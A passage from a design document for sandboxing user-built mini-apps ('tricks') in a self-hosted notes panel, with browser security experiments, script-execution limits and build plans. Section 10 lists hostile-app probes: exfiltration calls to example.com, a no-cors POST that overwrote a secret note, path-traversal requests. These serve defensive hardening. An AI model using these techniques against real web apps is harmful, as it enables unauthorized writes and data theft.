visible, paused on `document.visibilityState === "hidden"`. An app that
re-renders from that event is correct after an overnight run without doing
anything special. Polling rather than SSE because the panel has no push
transport today; SSE is a later, mechanical upgrade behind the same event.

`programacion` is unchanged from v1 and remains a **declaration**.
Materializing it is the `schedule-job` skill's job
(`vault-template/.claude/skills/schedule-job/`), which writes the runner,
the registry note and the cron block. **Do not build a second scheduling
mechanism here**, and nothing in the server writes a crontab.

---

## 9. Migration from v1

There are **no tricks in `vault-template/`** — the base package ships the
mechanism, not an example — so the base-package migration cost is the docs
and the skill, not data. At least one real deployment has v1 tricks.

1. **v1 is retired as an authoring target.** `trick-creator` stops emitting
   `ui.campos`/`control:` manifests the moment its v2 rewrite lands.
2. **The panel keeps rendering v1 manifests for one release.** A manifest
   with no `app:` block renders through the existing `TrickRenderer`, with
   a visible "legacy trick" label and a line saying how to convert it. This
   is a compatibility window, not a supported second system: no v1 bug gets
   fixed, no v1 primitive gets added.
3. **Conversion is mechanical**, because the vocabulary is small. The base
   package ships starter apps at
   `vault-template/.claude/tricks/_plantillas/`:

   | Starter | Replaces |
   |---|---|
   | `lista/` | `lista` + `checkbox` + `fecha` + `select` rows |
   | `formulario/` | `formulario` |
   | `boton/` | `boton` + `correr_script`, with stdout rendered |
   | `tablero/` | a read-only summary with a chart |

   `trick-creator` copies one into `app/` and edits it. The "I just want a
   checklist" request stays a one-step request; it now produces files the
   author can then change without waiting for a new primitive, which is the
   entire point.
4. **Then delete the v1 renderer** — `TrickRenderer`, `ListaControl`,
   `ReadOnlyField`, and the v1 branches of `TrickAction` — along with this
   section. Two systems that render tricks is exactly the drift this repo
   keeps writing down as a bug.

---

## 10. Experiments

Everything below was **run**, in **Chrome 151 on macOS**, against a
throwaway prototype (a Node HTTP server plus four trick apps) that
reproduces the serving model, the CSP, the bridge, and the server-side
capability checks. Unlabelled statements were observed. The prototype is
not in this repo.

`assumed:` Firefox and Safari behave the same. The mechanisms used —
iframe `sandbox`, `Content-Security-Policy: sandbox`, opaque origins,
`MessageChannel`, `Sec-Fetch-*` — are specified and broadly supported, but
none of this was run outside Chromium and the `Sec-Fetch-*` gate in
particular deserves a check on each target browser before it is trusted.

The prototype panel held a cookie (`panel_session=…`) and a
`localStorage` item (`panel_secret=…`), and its API could read and write a
fake vault including a note deliberately outside every trick's scope.

### 10.1 The frame cannot reach the panel's origin

From a hostile app in `<iframe sandbox="allow-scripts">`:

| Attempt | Result |
|---|---|
| `window.origin` | `"null"` |
| `parent.document` | `SecurityError: Blocked a frame with origin "null" from accessing a cross-origin frame` |
| `top.document` | same |
| `window.frameElement` (to strip `sandbox`) | `null` — the iframe element is unreachable |
| `localStorage` | `SecurityError: … sandboxed and lacks the 'allow-same-origin' flag` |
| `sessionStorage` | `SecurityError`, same |
| `indexedDB.open()` | `SecurityError: access to the Indexed Database API is denied in this context` |
| `document.cookie` | `SecurityError`, same |
| `caches` | `SecurityError: Cache storage is disabled because the context is sandboxed` |

### 10.2 A non-trivial app renders correctly

The benign app loaded a relative stylesheet, a relative classic script, a
relative PNG, drew on a canvas, and handled pointer drag. It reported from
inside the frame:

```
origin=null  url=http://127.0.0.1:8799/api/tricks/pinta/app/
external CSS applied: body bg=rgb(251, 251, 253)   (unstyled default is rgba(0, 0, 0, 0))
external JS ran: yes
image loaded: 16x16                                (0x0 = failed)
canvas 2d: getImageData at (10,12) = [144,154,168,255]
bridge notes: 2
estado round-trip: {"booted":true}
localStorage available: no (SecurityError)
ES module <script type=module src=mod.js> ran: true
dynamic import(): ok
dynamic import (absolute): ok
Worker from blob: ran
```

Two findings behind those last four lines:

- **Without `Access-Control-Allow-Origin: *` on app files, ES modules do
  not load at all** (`ran: false`), because module scripts are always
  fetched in CORS mode. Adding `*` fixed it.
- **Dynamic `import()` from a classic script initially failed** with
  `TypeError: Failed to resolve module specifier './mod.js'. The base URL
  is about:blank because import() is called from a CORS-cross-origin
  script.` Adding `crossorigin` to the entry `<script>` tag fixed both the
  relative and absolute forms. This is guidance `trick-creator` must carry:
  **entry scripts get `crossorigin`.**

### 10.3 An opaque origin does not protect a write API — `connect-src` does

A third app was served with the same sandbox but with `connect-src`
permitting the panel's origin, isolating the CORS layer from the CSP layer:

| Attempt | Result |
|---|---|
| `fetch("/api/note?path=…")` | **request reached the server**; response unreadable (`TypeError`) |
| `fetch("/api/note", {method:"PUT", headers:{"Content-Type":"application/json"}})` | preflight `OPTIONS` sent, unanswered, PUT never sent |
| `fetch("/api/note", {method:"POST", mode:"no-cors", body: JSON.stringify(...)})` | **reached the server with `Origin: null`, `Content-Type: text/plain;charset=UTF-8`, and the prototype API wrote it** — `notas/secreto.md` became `PWNED-VIA-NO-CORS-POST` |

This is the result that decides §5.2's rejection of a second origin, and it
implies two rules beyond CSP:

- **`connect-src 'none'` is mandatory.** With it, every one of the above
  fails before leaving the browser (`TypeError: Failed to fetch`,
  `NetworkError` for XHR) — verified separately on the hostile app, which
  could not even fetch its own `probe.js`.
- **The API must reject a body it did not expect.** A "simple" cross-origin
  POST can always be sent, with `Content-Type` limited to `text/plain`,
  `application/x-www-form-urlencoded` or `multipart/form-data`.
  `assumed:` Fastify's built-in `text/plain` parser makes such a body
  arrive as a *string*, so the existing
  `const { path, content } = req.body ?? {}` in `index.ts` destructures to
  `undefined` and 400s — i.e. the real `PUT /api/note` is probably fine
  today, but by accident rather than by rule, and this was **not** tested
  against the real server. Any endpoint that mutates state should require
  `application/json` explicitly. Worth a quick check on the attachment
  upload route in particular, since `multipart/form-data` is a simple
  content type and that endpoint is built to accept it.

### 10.4 A hostile trick fails at every attack it tried

With the real policy (`connect-src 'none'`, no `allow-forms`, no
`allow-popups`, no `allow-top-navigation`):

| Attack | Result |
|---|---|
| `fetch("/api/note")` | `TypeError: Failed to fetch` (CSP) |
| `fetch("probe.js")` — its own asset | `TypeError` (CSP; `ACAO: *` does not help, `connect-src` bites first) |
| synchronous `XMLHttpRequest` to `/api/notes` | `NetworkError` |
| `navigator.sendBeacon("http://example.com/x")` | returned `true`; **no request left the browser** |
| `<img src="http://example.com/pixel.png?d=…">` | **no request** |
| `new WebSocket("ws://example.com/")` | object constructed; **no connection** |
| `new EventSource("/api/notes")` | object constructed; **no request** |
| form with `action="/api/note"`, `.submit()` | **no request** — server log shows zero `POST /api/note` other than 10.3's |
| `top.location.href = "http://example.com/top-pwned"` | `SecurityError: The current window does not have permission to navigate the target` — **`allow-top-navigation` is not granted, confirmed** |
| `window.open("http://example.com/popup")` | `null` |
| self-navigation to `http://example.com/pwned` | no network request; blocked by the panel's `frame-src 'self'` |
| bridge: `vault.write` (undeclared) | `{ok:false, error:{code:"capability_denied"}}` |
| bridge: `script.run` (undeclared) | `capability_denied` |
| bridge: `vault.read` with `params.path="../../notas/secreto.md"` | `capability_denied` |
| bridge: same message with `trick: "pinta"` added | still evaluated as the hostile trick — **port identity wins, the body field is ignored** |
| `window.parent.postMessage({op:"vault.write", …}, "*")` | host saw `origin: "null"`, logged it, and did not act — window-level messages carry no ops |

`eval`, `new Function` and a blob `Worker` all ran, as intended: they are
the author's own code inside their own opaque origin.

### 10.5 CSP `'self'` inside an opaque origin

A fourth app was served with the origin replaced by `'self'` throughout its
policy:

- its own `only.js` (same URL origin) **ran**;
- an otherwise identical `only2.js` served from `http://localhost:8799`
  (a different origin, same server) **did not run**;
- inline script ran (`'unsafe-inline'`); `fetch` was blocked
  (`connect-src 'none'`), proving the policy was enforced at all.

So `'self'` resolves against the document's **URL** origin, not its opaque
origin, and it genuinely constrains. `'self'` is the right thing to write.

### 10.6 `Sec-Fetch-*` discriminates the three ways an app URL is requested

Observed request headers:

```
panel mounts the frame   dest=iframe    site=same-origin
app's subresources       dest=script|style|image   site=cross-site
top-level open           dest=document  site=none
frame self-navigating
   into another trick    dest=iframe    site=cross-site
```

Before the gate, opening `…/api/tricks/hostil/app/` **top-level** loaded the
hostile app as its own page — still opaque-origin (so no `localStorage`, no
cookies), but **it redirected the tab to `https://example.com/top-pwned`**.
A top-level sandboxed document can navigate itself;
`Content-Security-Policy: sandbox` does not stop that. That is the concrete
reason the entry gate exists.

After implementing the §5.3 rule:

```
Sec-Fetch-Dest: document, Sec-Fetch-Site: none         → 403
Sec-Fetch-Dest: iframe,   Sec-Fetch-Site: cross-site   → 403
Sec-Fetch-Dest: iframe,   Sec-Fetch-Site: same-origin  → 200
```

and the frame's self-navigation into another trick's app was served 403 in
the browser too.

**The wrong version of this rule cost real time**, which is why §5.3 spells
it out: checking `Sec-Fetch-Site == "same-origin"` on *subresources* 403s
every script, stylesheet and image, and because the 403 body is JSON served
with `nosniff`, the symptom is "assets are fetched but never execute" with
no CSP violation and no obvious cause.

### 10.7 One port per mount

With the host naively re-handshaking on every `load` event, a frame that
navigated itself caused the host to **mint and hand over a second port to a
document it had never mounted** (observed twice: `mounted hostil, port
handed over` logged twice for one iframe).

The capability binding held — the second document was another trick's code,
and its calls were still evaluated against the *original* trick's
declarations, producing `DENIED undeclared capability estado.set` — so this
was not an escalation. But the invariant "this port belongs to the app I
loaded" was broken, and invariants that are broken but currently harmless
are how the §2.3 bug happens.

With the §6.2 rule (`handedOver` flag, unmount on the second `load`):
`hostil: SECOND load event — frame navigated itself; no new port, frame
discarded`, no second port, and the benign trick unaffected.

### 10.8 Server-side scope enforcement, independent of the browser

Called directly with `curl`, bypassing the host entirely:

```
POST /api/tricks/pinta/data/read   {"path":"notas/secreto.md"}        → 403 path outside declared carpeta
POST /api/tricks/pinta/data/read   {"path":"notas/gastos/../secreto.md"} → 403 (normalized first)
POST /api/tricks/pinta/data/write  {…}                                → 403 capability not declared
GET  /api/tricks/pinta/app/..%2f..%2f..%2fserver.mjs                  → 400 path escapes app/
```

### 10.9 The rejected alternatives, measured

- **`srcdoc`, relative `<script src="altprobe.js">`** → browser requested
  `/altprobe.js` (the panel's root), 404. Script did not run.
- **`srcdoc`, absolute `<script src="/api/tricks/pinta/app/altprobe.js">`**
  → 200, script ran, `location.href === "about:srcdoc"`, `origin === "null"`.
- **`blob:` URL frame** → document loaded, `origin === "null"`, but the
  absolute-path script produced **no request at all**; a `blob:` URL has an
  opaque path so nothing resolves against it.

---

## 11. `correr_script` — four constraints now, not three

Unchanged in kind from v1. Reproduced in full because it is the highest
boundary in the app and the v2 bridge reaches it (§7.5).

```yaml
acciones:
  - etiqueta: "Generar cierre de este mes"
    control: boton
    accion:
      correr_script:
        ruta: ".claude/tricks/cierre-financiero-mensual/generar.sh"
        args: []
```

Enforced server-side, none optional:

1. **`ruta` must resolve under `.claude/tricks/`.** Absolute paths and any
   `../` escape are rejected before anything runs. Deliberately **any**
   script under `.claude/tricks/`, not only the calling trick's own
   folder — a trick may reuse another's script.
2. **`execFile`, never a shell.** `args` is a fixed array from
   `trick.yaml`, passed straight to the child process. There is no shell
   parsing the argument list, so there is nothing for a crafted argument to
   break out of.
3. **A hard timeout** (5 s, `killSignal: "SIGKILL"`), so a hanging script
   cannot hang the request. The known orphaned-grandchild limitation is
   documented at the call site in `tricks.ts` and is unchanged.
4. **Only a filesystem author may declare what runs.** *(New. This
   constraint was always enforced by circumstance and is now enforced
   deliberately — see §2.3.)* `trick.yaml` and everything else under
   `.claude/` is executable configuration. **No network-reachable endpoint
   may create or modify any file under `.claude/`** — not the note write
   route, not attachment upload, not any future import, sync or restore
   path. The client selects an index; only someone who could already run
   code on the box gets to say what that index means.

The client still supplies **nothing but an index**. `ruta` and `args` come
from the server's own fresh read of `trick.yaml` inside `runTrickAction`.
`readTrickManifest` deliberately never caches, so an action reflects what
is on disk now, not what a client claims about a manifest it fetched
earlier.

These constraints exist because **this app has no auth** (rule 3) — the
tailnet is the perimeter, so anything on it can press this button. They are
not a consequence of wanting a human in the loop; rule 4 no longer asks for
one. All four would still be required if every run were unattended.

A script that needs Claude is not a `correr_script` action from a button —
that is `requiere_llm: true` and a scheduled job (§8).

**Credentials.** A script that needs a secret reads it from a file outside
the vault (e.g. `~/.config/<name>/env`), sourced by the script. Never a
credential in the vault: it is a git repo.

---

## 12. What `trick-creator` becomes

The skill's job changes from "translate a request into a manifest using
only these primitives" to "**write a small web app, and declare the
narrowest set of capabilities it needs**." Sketch of the rewritten
instructions:

1. **Ask what you need.** What does one item look like; what can the user
   do to it; should anything happen on a schedule. Unchanged, and still the
   step that saves the most rework.
2. **Design the data shape first, as files.** Notes with frontmatter, in a
   named folder. The app is a view over files, not a store.
   Output belongs next to what it is *about*, never a dump folder
   (`docs/roadmap.md` §9).
3. **Write the app.** One `index.html` plus whatever it needs. There is no
   vocabulary to stay inside. Start from a starter in
   `.claude/tricks/_plantillas/` when one fits; do not use one when it
   doesn't.
4. **The environment, stated plainly, because it is not a normal page:**
   - No network. `fetch`, `XMLHttpRequest`, `WebSocket`, `EventSource`,
     `sendBeacon`, remote images and remote fonts **all fail**. Everything
     the app needs must be a file under `app/`, a data URI, or a bridge
     call. No CDN, no Google Fonts, no CSS reset from a URL.
   - No `localStorage`, `sessionStorage`, IndexedDB or Cache Storage — all
     throw. Persist through `estado`.
   - Put `crossorigin` on the entry `<script>` tag if the app uses
     `import()`; `<script type="module">` works as-is.
   - Canvas, SVG, Web Animations, pointer events, blob Workers, `eval` all
     work. Prefers-color-scheme works; the host also sends a `tema` event.
   - The app cannot open a window, submit a form, or navigate anywhere. If
     it navigates itself, the panel unmounts it.
5. **Declare the narrowest capabilities.** One `carpeta`, the trick's own
   data folder by default. `vault.write` lists the exact frontmatter fields
   it may change. "Write any note" is not a capability, and the manifest
   validator refuses a whole-vault `carpeta`. If the app asks for something
   undeclared, the bridge answers `capability_denied` and the panel shows
   it — so an under-declared manifest fails loudly, which is the intended
   development loop.
6. **Degrade honestly.** A trick that is half-built says so in its own
   output, in plain language (`panel/pendientes.md`-style). Never a
   silently broken button.
7. **`correr_script` only for deterministic code**, with §11 read first.
   If the real logic isn't available yet, write a script that says so and
   exits cleanly.
8. **Scheduling is a declaration**; hand off to `schedule-job` to install
   it. Ask first whether a fixed rule suffices (`requiere_llm: false`) —
   an agent run for something a script can do is slower and costlier, and
   that is an engineering argument, not a safety one.
9. **Tell the user what you built** in plain language: what it tracks,
   where the data lives, what they can click, when anything runs on its
   own, and how to turn it off.

---

## 13. Build order and seams

Six pieces. **1, 2, 3 and 4 can be built in parallel** once this document
is agreed, because they touch disjoint files and meet only at the protocol.

**1. Serving (server only).** `panel/server/src/tricks.ts` +
one new route group in `index.ts`.
- `app:` and `capacidades:` in the manifest schema and its validation (§4.1)
- `GET /api/tricks/:name/app/*` with the path resolution, the `Sec-Fetch-*`
  gate and the exact headers (§5.3)
- `tipo: "app" | "legacy"` on the `GET /api/tricks` summary
- The panel's own CSP header, including `frame-src 'self'` (§5.4)
- *Testable entirely with `curl`; needs no frontend. Ship it first — every
  other piece is easier to build against a real endpoint.*

**2. Host (frontend only).** `panel/web/src/tricks/TrickHost.tsx`, new file.
- iframe with exactly `sandbox="allow-scripts"`, one port per mount,
  unmount on a second `load` (§6.2)
- envelope validation, `Map`-keyed correlation, rate limits (§6.4, §6.6)
- first-line capability check and visible `capability_denied` reporting
- *Build against a hand-written `app/` folder; no server work needed beyond
  seam 1.*

**3. Bridge server side (server only).** One route:
`POST /api/tricks/:name/bridge`, one funnel.
- `vault.query` / `vault.read` / `vault.write` scope enforcement (§7.1–7.3)
- `estado` (§7.4), `script.run` delegating to the **unchanged**
  `runTrickAction` (§7.5)
- *Different route group from seam 1; the two can land in either order.*

**4. Authoring (vault-template only).**
- the four starter apps under `vault-template/.claude/tricks/_plantillas/`
- the `trick-creator` rewrite (§12)
- the tricks section of `vault-template/CLAUDE.md`
- *No panel code. Fully parallel with 1–3.*

**5. Write-path refusal (cross-cutting, do not defer).** Audit every
endpoint that can place a file — note write, attachment upload, and
anything added since — and refuse `.claude/` (§2.2, §11 constraint 4). Add
a test per endpoint whose name says *why*. Partly done by the attachments
work; confirm rather than assume.

**6. Freshness and retirement (after 1–4).**
- `datos.cambiaron` polling and the `tema` event (§8)
- `trabajo.estado` (§7.6), sharing a parser with the jobs view
  (`docs/roadmap.md` §10)
- then delete the v1 renderer and §9

**The seam that must not move:** §6 (the envelope, port identity, one port
per mount) and §7 (capability names and scope semantics). Seams 2 and 3
both implement them and must agree exactly; everything else can be
renegotiated locally.

---

## 14. Known gaps

- **Only Chrome 151/macOS was tested.** `assumed:` for Firefox and Safari.
  The `Sec-Fetch-*` gate is the piece most worth re-verifying per browser,
  since it fails closed and would present as "the trick doesn't render."
- **No conflict detection on writes**, carried over from v1 (§7.3).
- **The panel has no push transport**, so freshness is polling (§8).
- **A trick can lie inside its own rectangle** (§2.4). Mitigated by chrome
  around the frame, not solved.
- **`app/` has no size or file-count limit** specified. Add one before a
  trick ships a 40 MB asset.
- **A `vault.write` that touches one frontmatter field reformats YAML
  dates in the same file.** Measured: writing `monto` to a note rewrote
  `fecha: 2026-08-01` as `fecha: 2026-08-01T00:00:00.000Z`, because the
  read-modify-write goes through `gray-matter`/`js-yaml`, which parse a
  YAML timestamp into a `Date` and dump it back as ISO. Not a security
  issue; it is a git-diff issue in a git-backed vault, and it will hit
  dashboard row actions (plan §5.5) identically. Worth one fix in one
  place — a YAML schema that leaves timestamps as strings — rather than
  two divergent ones.
- **The attachment preview tier could reach the network until
  2026-08-15.** `Content-Security-Policy: sandbox allow-scripts` with no
  other directive gives an opaque origin that can still `fetch`. Measured
  in Chrome: an uploaded `report.html` served by `/api/attachment` issued
  `fetch("/api/note?path=…")` and the request arrived. Nothing was read
  (no `Access-Control-Allow-Origin` on data routes) or written (the
  cross-site guard), but "talking to the outside world" is an escalation
  in its own right (§2.1). Now carries `connect-src 'none';
  form-action 'none'`, matching the trick-app policy; re-measured as
  blocked. The general shape is worth keeping in mind: **an opaque origin
  bounds what a document can *read*, never what it can *send*.**
- **Nothing enumerates which tricks exist to a scheduled job**; a job that
  wants a trick's data reads the files, like everything else.
